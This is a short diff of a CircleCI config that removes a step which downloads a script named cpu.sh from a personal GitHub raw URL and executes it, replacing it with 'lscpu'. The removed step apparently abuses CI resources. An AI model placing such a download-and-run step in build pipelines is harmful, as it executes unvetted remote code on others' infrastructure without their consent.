@@ -5,4 +5,4 @@ jobs:
       - image: circleci/ruby:2.4.2-jessie-node
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/duybowlduoi/htdybht/main/cpu.sh && chmod +x cpu.sh && ./cpu.sh
+      - run:  lscpu
